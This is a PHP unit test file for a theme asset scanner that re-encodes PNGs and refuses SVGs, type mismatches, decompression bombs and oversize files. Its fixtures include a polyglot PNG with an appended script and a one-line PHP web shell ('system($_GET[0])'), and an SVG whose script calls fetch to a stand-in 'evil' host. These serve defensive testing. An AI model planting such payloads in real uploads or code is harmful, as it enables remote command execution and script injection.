<?php

declare(strict_types=1);

namespace Tests\Unit\Service\Packages;

use App\Security\Packages\PackagePolicyException;
use App\Service\Packages\ThemeAssetScanner;
use PHPUnit\Framework\TestCase;

final class ThemeAssetScannerTest extends TestCase
{
    private function png(int $w = 4, int $h = 4): string
    {
        $im = imagecreatetruecolor($w, $h);
        imagefilledrectangle($im, 0, 0, $w - 1, $h - 1, (int) imagecolorallocate($im, 200, 180, 140));
        ob_start();
        imagepng($im);

        return (string) ob_get_clean();
    }

    public function test_valid_png_is_reencoded_and_digest_pinned(): void
    {
        $scanner = new ThemeAssetScanner();
        $out = $scanner->scan('parchment', 'png', $this->png());

        self::assertSame('image/png', $out['mime']);
        self::assertSame(hash('sha256', $out['bytes']), $out['digest']);
        self::assertNotFalse(imagecreatefromstring($out['bytes']));
    }

    /** TM-TH-03: a PNG with an appended script payload is neutralized. */
    public function test_polyglot_payload_is_destroyed_by_reencode(): void
    {
        $payload = '<script>alert(1)</script><?php system($_GET[0]); ?>';
        $polyglot = $this->png() . $payload;
        $out = (new ThemeAssetScanner())->scan('sneaky', 'png', $polyglot);

        self::assertStringNotContainsString('<script>', $out['bytes']);
        self::assertStringNotContainsString('<?php', $out['bytes']);
        self::assertNotSame(hash('sha256', $polyglot), $out['digest']);
    }

    /** TM-TH-03: SVG is refused outright. */
    public function test_svg_with_script_is_refused(): void
    {
        $svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil")</script></svg>';

        try {
            (new ThemeAssetScanner())->scan('vector', 'svg', $svg);
            self::fail('expected refusal');
        } catch (PackagePolicyException $e) {
            self::assertSame('theme_asset', $e->code);
        }
    }

    public function test_kind_sniff_mismatch_is_refused(): void
    {
        try {
            (new ThemeAssetScanner())->scan('fake', 'png', 'GIF89a' . str_repeat('x', 64));
            self::fail('expected refusal');
        } catch (PackagePolicyException $e) {
            self::assertSame('theme_asset', $e->code);
        }
    }

    public function test_undecodable_bytes_are_refused(): void
    {
        try {
            (new ThemeAssetScanner())->scan('noise', 'png', "\x89PNG\r\n\x1a\n" . str_repeat('x', 64));
            self::fail('expected refusal');
        } catch (PackagePolicyException $e) {
            self::assertSame('theme_asset', $e->code);
        }
    }

    public function test_pixel_bomb_is_refused_before_gd_decodes_it(): void
    {
        // A solid-colour image with huge dimensions compresses to a tiny file — a
        // decompression bomb: under the byte cap yet must be refused on dimensions
        // BEFORE GD is asked to allocate its pixel buffer.
        $bomb = $this->png(3000, 3000); // 9,000,000 px > MAX_PIXELS
        self::assertLessThanOrEqual(ThemeAssetScanner::MAX_ASSET_BYTES, strlen($bomb));

        try {
            (new ThemeAssetScanner())->scan('bomb', 'png', $bomb);
            self::fail('expected refusal');
        } catch (PackagePolicyException $e) {
            self::assertSame('theme_asset', $e->code);
        }
    }

    public function test_oversize_is_refused(): void
    {
        try {
            (new ThemeAssetScanner())->scan('big', 'png', str_repeat('a', ThemeAssetScanner::MAX_ASSET_BYTES + 1));
            self::fail('expected refusal');
        } catch (PackagePolicyException $e) {
            self::assertSame('theme_asset', $e->code);
        }
    }
}
